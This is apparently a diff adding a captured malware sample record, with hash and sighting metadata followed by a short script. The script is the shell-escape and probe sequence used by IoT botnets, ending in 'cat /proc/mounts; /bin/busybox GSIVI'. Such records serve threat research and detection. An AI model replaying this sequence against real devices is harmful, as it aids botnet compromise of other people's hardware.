@@ -1,0 +1,14 @@
+# sha256: 3d309f83e479f49bae40a818c7b8abaae5147bbf2e48b22e3eb6ff5b2b72bbf7
+# family: script_generic
+# kind: script
+# size_bytes: 59
+# first_seen: 2026-08-26 05:38:46.709000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox GSIVI
